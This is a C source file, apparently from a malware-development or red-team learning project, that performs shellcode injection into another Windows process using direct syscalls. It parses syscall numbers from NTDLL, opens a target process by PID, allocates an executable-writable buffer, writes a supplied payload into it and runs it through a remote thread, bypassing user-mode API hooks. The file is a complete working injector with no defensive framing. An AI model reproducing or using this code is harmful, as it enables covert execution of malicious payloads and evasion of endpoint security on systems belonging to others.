#include "injection.h"

VOID PrettyFormat(
        _In_ LPCSTR FunctionName,
        _In_ CONST DWORD Error
) {

    if (NULL == FunctionName || 0 == Error) {
        WARN("either you didn't supply a function name"
             "or the function actually returned successfully");
    }

    WARN("[%s] failed, error: 0x%lx", FunctionName, Error);
    return;

}

DWORD GetSyscallNumber(
        _In_ HMODULE hNTDLL,
        _In_ LPCSTR NtFunctionName
) {

    DWORD    SyscallNumber     = 0;
    UINT_PTR NtFunctionAddress = 0;

    NtFunctionAddress = (UINT_PTR)GetProcAddress(hNTDLL, NtFunctionName);
    if (NULL == (PVOID)NtFunctionAddress) {
        PrettyFormat("GetProcAddress", GetLastError());
        return 0;
    }

	/*                                           .----------------------------.
		NtFunction+0x0:    4C 8B D1              |      mov r10, rcx          |
		NtFunction+0x3:    B8 ?? 00 00 00 >------'      mov eax, [??] <-------'
		[...]              [...]                        [...]     |
		NtFunction+0x12:   0F 05                        syscall   |                      
		NtFunction+0x14:   C3                           ret       |
                                      .---------------------------'
                                      |
                                      '---------------> SSN */

    SyscallNumber = ((PBYTE)(NtFunctionAddress + 0x4))[0]; 
    OKAY("[0x%p] [0x%0.3lx] got the address and SSN of %s!", 
            (PVOID)NtFunctionAddress, 
            SyscallNumber,
            NtFunctionName
    );
    return SyscallNumber;

}

BOOL DirectSyscallsInjection(
        _In_ CONST DWORD PID,
        _In_ CONST PBYTE Payload,
        _In_ CONST SIZE_T PayloadSize
) {

    HANDLE   hProcess      = NULL;
    HANDLE   hThread       = NULL;
    HMODULE  hNTDLL        = NULL;
    PVOID    rBuffer       = NULL;
    SIZE_T   BytesWritten  = 0;
    NTSTATUS STATUS        = 0;
    BOOL     STATE         = TRUE; 

    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL  };
    CLIENT_ID CID        = { (HANDLE)PID, NULL };

    if (NULL == Payload || 0 == PayloadSize) {
        WARN("payload's not set. exiting...");
        return FALSE;
    }

    INFO("initializing globals...");
    hNTDLL = GetModuleHandleW(L"NTDLL");
    if (NULL == hNTDLL) {
        PrettyFormat("GetModuleHandleW", GetLastError());
        return FALSE; 
    }
    OKAY("[0x%p] got the address of NTDLL", hNTDLL);

    g_NtOpenProcessSSN           = GetSyscallNumber(hNTDLL, "NtOpenProcess");
    g_NtAllocateVirtualMemorySSN = GetSyscallNumber(hNTDLL, "NtAllocateVirtualMemory");
    g_NtWriteVirtualMemorySSN    = GetSyscallNumber(hNTDLL, "NtWriteVirtualMemory");
    g_NtCreateThreadExSSN        = GetSyscallNumber(hNTDLL, "NtCreateThreadEx");
    g_NtWaitForSingleObjectSSN   = GetSyscallNumber(hNTDLL, "NtWaitForSingleObject");
    g_NtCloseSSN                 = GetSyscallNumber(hNTDLL, "NtClose");

    INFO("attempting to get a handle on the process (%ld)...", PID);
    STATUS = fn_NtOpenProcess(
            &hProcess,
            PROCESS_ALL_ACCESS,
            &OA,
            &CID
    );
    if (STATUS_SUCCESS != STATUS) {
        PrettyFormat("NtOpenProcess", STATUS);
        STATE = FALSE; goto CLEAN_UP;
    }
    OKAY("[0x%p] got a handle on the process (%ld)", hProcess, PID);

    STATUS = fn_NtAllocateVirtualMemory(
            hProcess,
            &rBuffer,
            0,
            &PayloadSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
    );
    if (STATUS_SUCCESS != STATUS) {
        PrettyFormat("NtAllocateVirtualMemory", STATUS);
        STATE = FALSE; goto CLEAN_UP;
    }
    OKAY("[0x%p] [RWX] allocated a %zu-byte buffer with PAGE_EXECUTE_READWRITE permissions!", 
            rBuffer, PayloadSize);

    STATUS = fn_NtWriteVirtualMemory(
            hProcess,
            rBuffer,
            Payload,
            PayloadSize,
            &BytesWritten
    );
    if (STATUS_SUCCESS != STATUS) {
        PrettyFormat("NtWriteVirtualMemory", STATUS);
        STATE = FALSE; goto CLEAN_UP;
    }
    /* r/masterhacker */
    for (SIZE_T i = 0; i <= BytesWritten; i++) {
        PROG("[0x%p] [RWX] [%zu/%zu] writing payload to buffer...",
                rBuffer, i, BytesWritten);
    }
    (VOID)puts("");

    STATUS = fn_NtCreateThreadEx(
            &hThread,
            THREAD_ALL_ACCESS,
            &OA,
            hProcess,
            rBuffer,
            NULL,
            FALSE,
            0,
            0,
            0,
            NULL
    );
    if (STATUS_SUCCESS != STATUS) {
        PrettyFormat("NtCreateThreadEx", STATUS);
        STATE = FALSE; goto CLEAN_UP;
    }
    OKAY("[0x%p] successfully created a thread! waiting for it to finish execution...", hThread);

    STATUS = fn_NtWaitForSingleObject(
            hThread,
            FALSE,
            NULL
    );
    INFO("[0x%p] thread finished execution! beginning cleanup...", hThread);

CLEAN_UP:

    /* you should look into using NtFreeVirtualMemory
       for cleanup as well for our allocated buffer. */

    if (hThread) {
        fn_NtClose(hThread);
        INFO("[0x%p] handle on thread closed", hThread);
    }

    if (hProcess) {
        fn_NtClose(hProcess);
        INFO("[0x%p] handle on process closed", hProcess);
    }

    return STATE;

}
